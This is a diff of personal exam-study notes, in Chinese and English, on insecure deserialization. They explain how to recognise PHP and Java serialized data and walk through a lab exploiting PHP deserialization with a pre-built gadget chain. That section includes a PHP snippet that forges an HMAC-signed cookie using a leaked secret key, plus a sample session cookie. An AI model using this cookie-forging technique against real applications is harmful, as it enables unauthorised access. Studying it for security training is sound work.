@@ -38,9 +38,26 @@ Search the web for "Handlebars server-side template injection". You should find 
 
 3. Insecure deserialization
 常见注入点: 
- a. 
+ a. cookie
  
 常见特征:
+ PHP uses a mostly human-readable string format, with letters representing the data type and numbers representing the length of each entry. 
+ For example, consider a User object with the attributes:O:4:"User":2:{s:4:"name":s:6:"carlos"; s:10:"isLoggedIn":b:1;}
  
+ Java, use binary serialization formats. This is more difficult to read, but you can still identify serialized data if you know how to recognize
+ a few tell-tale signs. For example, serialized Java objects always begin with the same bytes, which are encoded as ac ed in hexadecimal and rO0 in Base64.
  
-常见使用payload:
+ 大概率考法:
+ lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain
+ Assign the secret key that you copied from the phpinfo.php file to the $secretKey variable.
+<?php
+$object = "OBJECT-GENERATED-BY-PHPGGC";
+$secretKey = "LEAKED-SECRET-KEY-FROM-PHPINFO.PHP";
+$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
+echo $cookie;
+这里很重要的一个点是要找到这个secret key
+
+遇到的考题中有个cookie是这样的，虽然还没有遇到专门考它的点，但是也许有些题就是跟这个有关的。咨询了一下小黑，说是AES加密，同样需要有key.所以说不定跟上面这个lab是同样的思路，
+session=%7b%22username%22%3anull%2c%22isloggedin%22%3afalse%7d--MCwCFBWsmuznMGBzRTveQHZaciakIfiiAhQ73vjIL0MIisP81SYi2t%2bfRkpHwg%3d%3d;
+url解码后变成
+session={"username":null,"isloggedin":false}--MCwCFBWsmuznMGBzRTveQHZaciakIfiiAhQ73vjIL0MIisP81SYi2t+fRkpHwg==;
